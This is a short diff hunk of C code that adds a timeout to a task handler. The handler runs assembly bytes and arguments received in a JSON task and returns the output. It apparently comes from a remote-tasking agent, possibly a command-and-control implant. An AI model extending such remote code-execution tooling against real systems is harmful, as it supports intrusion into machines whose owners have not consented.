@@ -2922,7 +2922,8 @@ void dispatch_task(AgentTask *task) {
         }
         char asm_args[4096] = {0};
         json_get_str(jargs, "args", asm_args, sizeof(asm_args), "");
-        char *out = fork_run_assembly(asm_bytes, asm_len, asm_args);
+        int timeout_sec = json_get_int(jargs, "timeout_sec", 0);
+        char *out = fork_run_assembly(asm_bytes, asm_len, asm_args, timeout_sec);
         free(asm_bytes);
         agent_send_result(task->id, out ? out : "(null output)", "");
         free(out);
